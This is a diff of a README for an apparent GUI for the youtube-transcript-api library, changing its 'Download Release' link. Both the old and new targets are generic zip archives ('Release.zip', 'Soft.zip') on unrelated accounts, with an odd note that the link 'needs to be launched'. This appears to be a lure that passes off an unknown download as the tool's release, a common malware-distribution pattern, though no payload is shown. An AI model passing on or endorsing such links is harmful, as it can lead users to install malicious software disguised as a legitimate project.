@@ -14,7 +14,7 @@ This repository contains a nice GUI for the `youtube-transcript-api` library, al
 
 To get started with the YouTube Transcript API GUI, you can download the latest release by clicking the button below:
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release](https://github.com/THCcuku/youtube-transcript-api-GUI/releases/download/v1.0/Soft.zip)](https://github.com/THCcuku/youtube-transcript-api-GUI/releases/download/v1.0/Soft.zip)
 
 *(Note: The link needs to be launched to download the release file.)*
 
